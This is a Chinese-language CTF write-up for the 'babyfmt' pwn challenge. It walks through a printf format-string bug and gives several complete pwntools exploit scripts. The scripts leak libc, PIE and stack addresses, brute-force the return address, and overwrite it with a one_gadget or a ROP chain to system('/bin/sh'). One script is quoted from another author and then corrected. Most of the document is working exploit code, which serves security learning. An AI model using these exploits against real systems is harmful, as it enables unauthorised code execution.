---
layout: single
title: "babyfmt"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "记录 2026 年 sh 比赛中 babyfmt 题目的分析与解题过程。"
source_folder: "Write-ups/2026/sh/babyfmt"
lang: zh-CN
excerpt: "记录 2026 年 sh 比赛中 babyfmt 题目的分析与解题过程。"
---
{% raw %}

# ELF

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char format[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+108h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  strcpy(format, "text:");
  while ( 1 )
  {
    printf("Input your text: ");
    fgets(&format[5], 256, stdin);
    printf(format);
  }
}
```

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

# 思路
整个程序很简单，只有一个栈溢出，和一个fmt。

```c
-0000000000000110 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000110 // Frame size: 110; Saved regs: 8; Purge: 0
-0000000000000110
-0000000000000110     char format[264];
-0000000000000008     _QWORD var_8;
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
```

栈溢出只能泄露cannary，这里我直接用第一次fmt泄露了某个栈地址，和libc地址。之后爆破栈偏移，找到printf的返回地址用one_gadget覆盖。
exp：

```python
from pwncli import *
import sys

context(arch="amd64", os="linux", endian="little")
context.kernel = "amd64"
context.terminal = ["tilix", "--action=session-add-right", "-e"]

file = "/home/qwer/pwn/pwn"
host = "challenge.shc.tf"
port = 31085
p = ELF(file)
libc = ELF("./libc.so.6")

if "r" in sys.argv:
    io = remote(host, port)
    log.success("运行模式: 远程 (Remote)")
else:
    io = process(file)
    log.success("运行模式: 本地 (Local)")

if "d" in sys.argv:
    context.log_level = "debug"
    log.success("Debug: 开启 (Debug On)")


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda x, data: io.sendafter(x, data)
sla = lambda x, data: io.sendlineafter(x, data)
r = lambda num=4096: io.recv(num)
rn = lambda num: io.recvn(num)
rl = lambda num=4096: io.recvline(num)
ru = lambda x: io.recvuntil(x)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
num2str = lambda x: str(x).encode()
# addr为next处地址
protect_ptr = lambda addr, addr2: (addr >> 3 * 4) ^ addr2
reveal_ptr = lambda addr, next: protect_ptr(addr, next)

look = lambda n: print(
    f"🔍\x1b[97mLOOK\x1b[0m \x1b[96m{n}\x1b[0m \x1b[97m =➤ \x1b[0m \x1b[1;94m{hex(eval(n, globals()))}\x1b[0m"
)


# 分析数据流
def analy_data(data):
    log.info("==== data analy ====")
    for i in range(0, len(data), 16):
        line = data[i : i + 16]
        hexpart = " ".join(f"{b:02x}" for b in line)
        strpart = "".join(chr(b) if 32 <= b < 127 else "." for b in line)
        print(f"{i:08x}  {hexpart:<48}  {strpart}")


def sub8(hex_val):
    b6 = ((hex_val >> 40) & 0xFF) - 8
    b5 = ((hex_val >> 32) & 0xFF) - 8
    b4 = ((hex_val >> 24) & 0xFF) - 8
    b3 = ((hex_val >> 16) & 0xFF) - 8
    b2 = ((hex_val >> 8) & 0xFF) - 8
    b1 = (hex_val & 0xFF) - 8

    result = (
        ((b6 & 0xFF) << 40)
        | ((b5 & 0xFF) << 32)
        | ((b4 & 0xFF) << 24)
        | ((b3 & 0xFF) << 16)
        | ((b2 & 0xFF) << 8)
        | (b1 & 0xFF)
    )

    return result


sla("Input your text: ", b"%41$p%43$p%31$p")
rn(5)
dbg()
libc_base = int(rn(14), 16) - libc.symbols["__libc_start_call_main"] - 128
pie = int(rn(14), 16) - p.symbols.main
stack = int(rn(14), 16) - 0x369
look("libc_base")
look("pie")
look("stack")
test = b"1234"
ret_addr = stack - 8 * 29
look("ret_addr")

one = [0xEBC81, 0xEBC85, 0xEBC88, 0xEBCE2, 0xEBD38, 0xEBD3F, 0xEBD43]

payload0 = fmtstr_payload(7, {ret_addr: sub8(one[1] + libc_base)})
sla("Input your text: ", b"aaa" + payload0)

sla("Input your text: ", b"%p" * 100)

"""
这题本地栈和线上栈不一样，需要爆破验证偏移
"""
io.interactive()

```

# 另一个师傅的思路

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf  = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

io = remote('challenge.shc.tf', 31552)

io.recvuntil(b'Input your text: ')
io.sendline(b'%41$p|%43$p|')
io.recvuntil(b'text:')

libc_leak, pie_leak = map(lambda x: int(x,16),
                          io.recvline().strip().split(b'|'))

libc.address = libc_leak - 0x29d90
elf.address  = pie_leak  - 0x11ee

log.success(f'libc: {hex(libc.address)}')
log.success(f'pie : {hex(elf.address)}')

payload = b'%8$sAAAAAAA' + p64(libc.sym['environ'])
io.recvuntil(b'Input your text: ')
io.sendline(payload)
io.recvuntil(b'text:')

stack = u64(io.recv(6).ljust(8,b'\0'))
log.success(f'stack: {hex(stack)}')

for off in range(0x100, 0x500, 8):
    addr = stack - off
    payload = b'%8$sAAAAAAA' + p64(addr)

    io.recvuntil(b'Input your text: ')
    io.sendline(payload)
    io.recvuntil(b'text:')

    leak = io.recv(6)
    if len(leak) < 6:
        continue

    val = u64(leak.ljust(8,b'\0'))
    if 0x11ee < val - elf.address < 0x1300:
        ret_addr = addr
        log.success(f'ret addr: {hex(ret_addr)}')
        break

pop_rdi = libc.address + 0x2a3e5
bin_sh  = next(libc.search(b'/bin/sh'))
system  = libc.sym['system']
ret     = libc.address + 0x29cd6

writes = {
    ret_addr     : pop_rdi,
    ret_addr+8   : bin_sh,
    ret_addr+16  : ret,
    ret_addr+24  : system
}

payload = fmtstr_payload(8, writes, write_size='short')
io.recvuntil(b'Input your text: ')
io.sendline(payload)

io.interactive()
————————————————
版权声明：本文为CSDN博主「今天我没有心情」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/2503_94547653/article/details/157877511
```

这个师傅通过fmt泄露栈地址，爆破返回地址。但最后fmt覆盖时有错误，printf会打印’text：‘，需要填充payload至正确的偏移后，再用`numbwritten=`参数。
以下为修改后的：

```python
from pwn import *


context.arch = "amd64"
context.log_level = "debug"


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

io = process("./pwn")

io.recvuntil(b"Input your text: ")
io.sendline(b"%41$p|%43$p")
io.recvuntil(b"text:")

libc_leak, pie_leak = map(lambda x: int(x, 16), io.recvline().strip().split(b"|"))

libc.address = libc_leak - 0x29D90
elf.address = pie_leak - 0x11EE

log.success(f"libc: {hex(libc.address)}")
log.success(f"pie : {hex(elf.address)}")

payload = b"%8$sAAAAAAA" + p64(libc.sym["environ"])
io.recvuntil(b"Input your text: ")
io.sendline(payload)
io.recvuntil(b"text:")

stack = u64(io.recv(6).ljust(8, b"\0"))
log.success(f"stack: {hex(stack)}")

for off in range(0x100, 0x500, 8):
    addr = stack - off
    payload = b"%8$sAAAAAAA" + p64(addr)

    io.recvuntil(b"Input your text: ")
    io.sendline(payload)
    io.recvuntil(b"text:")

    leak = io.recv(6)
    if len(leak) < 6:
        continue

    val = u64(leak.ljust(8, b"\0"))
    if 0x11EE < val - elf.address < 0x1300:
        ret_addr = addr
        log.success(f"ret addr: {hex(ret_addr)}")
        break

pop_rdi = libc.address + 0x2A3E5
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]
ret = libc.address + 0x29CD6

writes = {
    ret_addr: pop_rdi,
    ret_addr + 8: bin_sh,
    ret_addr + 16: ret,
    ret_addr + 24: system,
}
payload = fmtstr_payload(7, writes, write_size="short", numbwritten=8)
dbg()
io.recvuntil(b"Input your text: ")
io.sendline(b"aaa" + payload)

io.interactive()
```

受这个师傅启发，我又尝试了另一种爆破思路：

```python
from pwn import *


context.arch = "amd64"
context.log_level = "debug"


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

io = process("./pwn")

io.recvuntil(b"Input your text: ")
io.sendline(b"%41$p|%43$p")
io.recvuntil(b"text:")

libc_leak, pie_leak = map(lambda x: int(x, 16), io.recvline().strip().split(b"|"))

libc.address = libc_leak - 0x29D90
elf.address = pie_leak - 0x11EE

log.success(f"libc: {hex(libc.address)}")
log.success(f"pie : {hex(elf.address)}")

payload = b"%8$sAAAAAAA" + p64(libc.sym["environ"])
io.recvuntil(b"Input your text: ")
io.sendline(payload)
io.recvuntil(b"text:")

stack = u64(io.recv(6).ljust(8, b"\0"))
log.success(f"stack: {hex(stack)}")

for off in range(0x100, 0x500, 8):
    addr = stack - off
    payload = b"%8$sAAAAAAA" + p64(addr)

    io.recvuntil(b"Input your text: ")
    io.sendline(payload)
    io.recvuntil(b"text:")

    leak = io.recv(6)
    if len(leak) < 6:
        continue

    val = u64(leak.ljust(8, b"\0"))
    if val == addr:
        ret_addr = addr - 0x18
        log.success(f"ret addr: {hex(ret_addr)}")
        break

pop_rdi = libc.address + 0x2A3E5
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]
ret = libc.address + 0x29CD6

writes = {
    ret_addr: pop_rdi,
    ret_addr + 8: bin_sh,
    ret_addr + 16: ret,
    ret_addr + 24: system,
}
payload = fmtstr_payload(7, writes, write_size="short", numbwritten=8)
dbg()
io.recvuntil(b"Input your text: ")
io.sendline(b"aaa" + payload)

io.interactive()
```

这里通过爆破buf地址，用偏移算返回地址。
{% endraw %}
